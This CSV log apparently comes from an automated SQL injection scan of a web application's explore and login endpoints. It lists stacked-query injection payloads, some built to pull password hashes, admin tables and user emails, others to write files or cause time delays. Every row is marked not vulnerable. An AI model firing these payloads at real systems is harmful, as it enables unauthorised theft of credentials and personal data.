endpoint,field,payload,http_status,vulnerable,reason
GET /explore.php,cat,1' OR 1=1; SELECT 1 INTO OUTFILE '/tmp/x'--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT 1 INTO DUMPFILE '/tmp/x'--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT 1 INTO DUMPFILE '/tmp/x'--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT 1 INTO DUMPFILE '/tmp/x'--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT 1 FROM dual--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT 1 FROM dual--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT 1 FROM dual--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT 1 FROM information_schema.tables--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT 1 FROM information_schema.tables--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT 1 FROM information_schema.tables--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT 1 FROM mysql.user--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT 1 FROM mysql.user--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT 1 FROM mysql.user--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT 1 FROM pg_sleep(5)--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT 1 FROM pg_sleep(5)--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT 1 FROM pg_sleep(5)--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT pg_sleep(5)--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT pg_sleep(5)--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT pg_sleep(5)--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT sleep(5)--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT sleep(5)--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT sleep(5)--,200,False,No vulnerability indicator
GET /explore.php,q,"1' OR 1=1; SELECT benchmark(1000000,md5('x'))--",200,False,No vulnerability indicator
POST /login.php,email,"1' OR 1=1; SELECT benchmark(1000000,md5('x'))--",200,False,No vulnerability indicator
GET /explore.php,cat,"1' OR 1=1; SELECT benchmark(1000000,md5('x'))--",200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT count(*) FROM users--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT count(*) FROM users--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT count(*) FROM users--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT password_hash FROM users--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT password_hash FROM users--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT password_hash FROM users--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT email FROM users--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT email FROM users--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT email FROM users--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT * FROM users--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT * FROM users--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT * FROM users--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT * FROM campaigns--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT * FROM campaigns--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT * FROM campaigns--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT * FROM donations--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT * FROM donations--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT * FROM donations--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT * FROM admins--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT * FROM admins--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT * FROM admins--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT * FROM organizations--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT * FROM organizations--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT * FROM organizations--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT * FROM categories--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT * FROM categories--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT * FROM categories--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT * FROM reports--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT * FROM reports--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT * FROM reports--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT * FROM messages--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT * FROM messages--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT * FROM messages--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT * FROM gdpr_requests--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT * FROM gdpr_requests--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT * FROM gdpr_requests--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT * FROM cookie_consents--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT * FROM cookie_consents--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT * FROM cookie_consents--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT * FROM data_processing_log--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT * FROM data_processing_log--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT * FROM data_processing_log--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT * FROM documents--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT * FROM documents--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT * FROM documents--,200,False,No vulnerability indicator
GET /explore.php,q,1' OR 1=1; SELECT * FROM campaign_updates--,200,False,No vulnerability indicator
POST /login.php,email,1' OR 1=1; SELECT * FROM campaign_updates--,200,False,No vulnerability indicator
GET /explore.php,cat,1' OR 1=1; SELECT * FROM campaign_updates--,200,False,No vulnerability indicator
